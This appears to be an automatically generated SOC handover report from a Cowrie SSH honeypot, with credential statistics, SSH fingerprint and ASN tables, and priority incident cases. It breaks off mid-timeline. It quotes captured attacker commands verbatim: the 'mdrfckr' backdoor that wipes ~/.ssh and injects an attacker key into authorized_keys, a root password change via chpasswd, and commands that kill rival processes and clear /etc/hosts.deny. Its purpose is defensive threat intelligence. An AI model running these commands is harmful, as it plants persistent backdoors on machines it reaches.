# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-06 |
| **Generated At** | 2026-06-06T17:19:30Z |
| **Shift Time** | 17:19 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **249** |
| Confirmed Threats | **223** |
| False Positives Filtered | **26** (10.4%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **12** |
| High Severity Cases | **67** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **182** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **185** |
| Unique Credential Pairs | **121** |
| Unique Usernames | **83** |
| Unique Passwords | **104** |
| Successful Auth Pairs | **40** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 67 |
| `345gs5662d34` | 33 |
| `user` | 3 |
| `admin` | 2 |
| `odoo` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 33 |
| `3245gs5662d34` | 33 |
| `123456` | 9 |
| `1234` | 4 |
| `password` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 33 |
| `root` | `3245gs5662d34` | 33 |
| `adil` | `adil` | 1 |
| `admin` | `admin` | 1 |
| `luka` | `1234` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Mr@123456` | `52.169.217.131` | 2026-06-06T15:28:33 |
| `root` | `3245gs5662d34` | `52.169.217.131` | 2026-06-06T15:28:37 |
| `root` | `Password123!` | `52.169.217.131` | 2026-06-06T15:33:05 |
| `root` | `Asd123..` | `103.61.123.132` | 2026-06-06T15:33:52 |
| `root` | `3245gs5662d34` | `103.61.123.132` | 2026-06-06T15:33:55 |
| `root` | `Passw0rd#` | `52.169.217.131` | 2026-06-06T15:37:20 |
| `root` | `Qwer123456789` | `103.61.123.132` | 2026-06-06T15:37:58 |
| `root` | `root*123` | `103.61.123.132` | 2026-06-06T15:42:15 |
| `root` | `Password88**` | `52.169.217.131` | 2026-06-06T15:43:02 |
| `root` | `test12#` | `52.169.217.131` | 2026-06-06T15:47:19 |
| `root` | `aa789789` | `103.61.123.132` | 2026-06-06T15:48:39 |
| `root` | `a123456B` | `52.169.217.131` | 2026-06-06T15:49:29 |
| `root` | `linux2024` | `152.32.187.177` | 2026-06-06T15:49:39 |
| `root` | `3245gs5662d34` | `152.32.187.177` | 2026-06-06T15:49:42 |
| `root` | `123456zZ` | `103.61.123.132` | 2026-06-06T15:50:46 |
| `root` | `123456gg` | `52.169.217.131` | 2026-06-06T15:51:40 |
| `root` | `Xu123456@` | `52.169.217.131` | 2026-06-06T15:53:47 |
| `root` | `1978` | `52.169.217.131` | 2026-06-06T15:55:46 |
| `root` | `qqq` | `52.169.217.131` | 2026-06-06T15:57:53 |
| `root` | `Qwe2023` | `103.61.123.132` | 2026-06-06T15:59:19 |
| `root` | `A@1234` | `70.120.203.193` | 2026-06-06T16:01:36 |
| `root` | `3245gs5662d34` | `70.120.203.193` | 2026-06-06T16:01:43 |
| `root` | `Root-123` | `147.45.48.17` | 2026-06-06T16:02:55 |
| `root` | `3245gs5662d34` | `147.45.48.17` | 2026-06-06T16:03:01 |
| `root` | `daimler` | `103.61.123.132` | 2026-06-06T16:03:32 |
| `root` | `onkar123` | `52.169.217.131` | 2026-06-06T16:08:55 |
| `root` | `987654` | `52.169.217.131` | 2026-06-06T16:11:04 |
| `root` | `ABCD123` | `103.61.123.132` | 2026-06-06T16:11:55 |
| `root` | `Bm123456@` | `70.120.203.193` | 2026-06-06T16:12:52 |
| `root` | `1234pass` | `52.169.217.131` | 2026-06-06T16:13:04 |
| `root` | `!@#123` | `103.61.123.132` | 2026-06-06T16:14:04 |
| `root` | `'` | `14.103.114.231` | 2026-06-06T16:18:41 |
| `root` | `111` | `52.169.217.131` | 2026-06-06T16:19:04 |
| `root` | `bd123456` | `103.61.123.132` | 2026-06-06T16:24:38 |
| `root` | `wh@123456` | `70.120.203.193` | 2026-06-06T16:29:56 |
| `root` | `diego` | `70.120.203.193` | 2026-06-06T16:31:53 |
| `root` | `aa123123aa` | `70.120.203.193` | 2026-06-06T16:40:42 |
| `root` | `Root` | `70.120.203.193` | 2026-06-06T16:48:40 |
| `root` | `Qwerty#2023` | `62.132.18.142` | 2026-06-06T17:01:34 |
| `root` | `3245gs5662d34` | `62.132.18.142` | 2026-06-06T17:01:41 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **249** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 215 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 181 | 9 |
| `03a80b21afa8...` | Modern SSH client | 27 | 2 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `af8223ac9914...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 181 | 9 | Mirai/variant |
| `03a80b21afa8...` | libssh | 27 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 6 | 3 | — |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 33 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:rvq3wFmaBrVn"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.114.231`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `147.45.48.17`, `103.61.123.132`, `52.169.217.131`, `62.132.18.142`, `70.120.203.193`, `152.32.187.177`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **20** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS197540` | netcup GmbH | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS134238` | CHINANET Jiangx province IDC network | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (67)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a66b44a7030a

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:28 |
| **Last Seen** | 2026-06-06 15:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:28:33` | `cowrie.session.connect` |
| `2026-06-06 15:28:33` | `cowrie.client.version` |
| `2026-06-06 15:28:33` | `cowrie.client.kex` |
| `2026-06-06 15:28:33` | `cowrie.login.success` |
| `2026-06-06 15:28:34` | `cowrie.session.params` |
| `2026-06-06 15:28:34` | `cowrie.command.input` |
| `2026-06-06 15:28:34` | `cowrie.command.failed` |
| `2026-06-06 15:28:34` | `cowrie.log.closed` |
| `2026-06-06 15:28:34` | `cowrie.session.params` |
| `2026-06-06 15:28:34` | `cowrie.command.input` |
| `2026-06-06 15:28:34` | `cowrie.session.file_download` |
| `2026-06-06 15:28:34` | `cowrie.log.closed` |
| `2026-06-06 15:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2f4d5b65c9a

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:28 |
| **Last Seen** | 2026-06-06 15:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:28:37` | `cowrie.session.connect` |
| `2026-06-06 15:28:37` | `cowrie.client.version` |
| `2026-06-06 15:28:37` | `cowrie.client.kex` |
| `2026-06-06 15:28:37` | `cowrie.login.success` |
| `2026-06-06 15:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-733803562659

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:33 |
| **Last Seen** | 2026-06-06 15:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:33:04` | `cowrie.session.connect` |
| `2026-06-06 15:33:04` | `cowrie.client.version` |
| `2026-06-06 15:33:04` | `cowrie.client.kex` |
| `2026-06-06 15:33:05` | `cowrie.login.success` |
| `2026-06-06 15:33:05` | `cowrie.session.params` |
| `2026-06-06 15:33:05` | `cowrie.command.input` |
| `2026-06-06 15:33:05` | `cowrie.command.failed` |
| `2026-06-06 15:33:05` | `cowrie.log.closed` |
| `2026-06-06 15:33:06` | `cowrie.session.params` |
| `2026-06-06 15:33:06` | `cowrie.command.input` |
| `2026-06-06 15:33:06` | `cowrie.session.file_download` |
| `2026-06-06 15:33:06` | `cowrie.log.closed` |
| `2026-06-06 15:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e517f80c344a

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:33 |
| **Last Seen** | 2026-06-06 15:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:33:08` | `cowrie.session.connect` |
| `2026-06-06 15:33:08` | `cowrie.client.version` |
| `2026-06-06 15:33:08` | `cowrie.client.kex` |
| `2026-06-06 15:33:09` | `cowrie.login.success` |
| `2026-06-06 15:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec2cfe185813

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:33 |
| **Last Seen** | 2026-06-06 15:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:33:51` | `cowrie.session.connect` |
| `2026-06-06 15:33:51` | `cowrie.client.version` |
| `2026-06-06 15:33:52` | `cowrie.client.kex` |
| `2026-06-06 15:33:52` | `cowrie.login.success` |
| `2026-06-06 15:33:52` | `cowrie.session.params` |
| `2026-06-06 15:33:52` | `cowrie.command.input` |
| `2026-06-06 15:33:52` | `cowrie.command.failed` |
| `2026-06-06 15:33:53` | `cowrie.log.closed` |
| `2026-06-06 15:33:53` | `cowrie.session.params` |
| `2026-06-06 15:33:53` | `cowrie.command.input` |
| `2026-06-06 15:33:53` | `cowrie.session.file_download` |
| `2026-06-06 15:33:53` | `cowrie.log.closed` |
| `2026-06-06 15:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d33d849c53

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:33 |
| **Last Seen** | 2026-06-06 15:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:33:55` | `cowrie.session.connect` |
| `2026-06-06 15:33:55` | `cowrie.client.version` |
| `2026-06-06 15:33:55` | `cowrie.client.kex` |
| `2026-06-06 15:33:55` | `cowrie.login.success` |
| `2026-06-06 15:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b390d2abc9b3

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:37 |
| **Last Seen** | 2026-06-06 15:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:37:19` | `cowrie.session.connect` |
| `2026-06-06 15:37:19` | `cowrie.client.version` |
| `2026-06-06 15:37:19` | `cowrie.client.kex` |
| `2026-06-06 15:37:20` | `cowrie.login.success` |
| `2026-06-06 15:37:20` | `cowrie.session.params` |
| `2026-06-06 15:37:20` | `cowrie.command.input` |
| `2026-06-06 15:37:20` | `cowrie.command.failed` |
| `2026-06-06 15:37:21` | `cowrie.log.closed` |
| `2026-06-06 15:37:21` | `cowrie.session.params` |
| `2026-06-06 15:37:21` | `cowrie.command.input` |
| `2026-06-06 15:37:21` | `cowrie.session.file_download` |
| `2026-06-06 15:37:21` | `cowrie.log.closed` |
| `2026-06-06 15:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8dcacfa8fa0

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:37 |
| **Last Seen** | 2026-06-06 15:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:37:23` | `cowrie.session.connect` |
| `2026-06-06 15:37:23` | `cowrie.client.version` |
| `2026-06-06 15:37:23` | `cowrie.client.kex` |
| `2026-06-06 15:37:24` | `cowrie.login.success` |
| `2026-06-06 15:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4210023bb781

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:37 |
| **Last Seen** | 2026-06-06 15:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:37:58` | `cowrie.session.connect` |
| `2026-06-06 15:37:58` | `cowrie.client.version` |
| `2026-06-06 15:37:58` | `cowrie.client.kex` |
| `2026-06-06 15:37:58` | `cowrie.login.success` |
| `2026-06-06 15:37:59` | `cowrie.session.params` |
| `2026-06-06 15:37:59` | `cowrie.command.input` |
| `2026-06-06 15:37:59` | `cowrie.command.failed` |
| `2026-06-06 15:37:59` | `cowrie.log.closed` |
| `2026-06-06 15:37:59` | `cowrie.session.params` |
| `2026-06-06 15:37:59` | `cowrie.command.input` |
| `2026-06-06 15:37:59` | `cowrie.session.file_download` |
| `2026-06-06 15:37:59` | `cowrie.log.closed` |
| `2026-06-06 15:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06264d3b0ca3

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:38 |
| **Last Seen** | 2026-06-06 15:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:38:01` | `cowrie.session.connect` |
| `2026-06-06 15:38:01` | `cowrie.client.version` |
| `2026-06-06 15:38:01` | `cowrie.client.kex` |
| `2026-06-06 15:38:02` | `cowrie.login.success` |
| `2026-06-06 15:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f6e4bd174c0

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:42 |
| **Last Seen** | 2026-06-06 15:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:42:15` | `cowrie.session.connect` |
| `2026-06-06 15:42:15` | `cowrie.client.version` |
| `2026-06-06 15:42:15` | `cowrie.client.kex` |
| `2026-06-06 15:42:15` | `cowrie.login.success` |
| `2026-06-06 15:42:16` | `cowrie.session.params` |
| `2026-06-06 15:42:16` | `cowrie.command.input` |
| `2026-06-06 15:42:16` | `cowrie.command.failed` |
| `2026-06-06 15:42:16` | `cowrie.log.closed` |
| `2026-06-06 15:42:16` | `cowrie.session.params` |
| `2026-06-06 15:42:16` | `cowrie.command.input` |
| `2026-06-06 15:42:16` | `cowrie.session.file_download` |
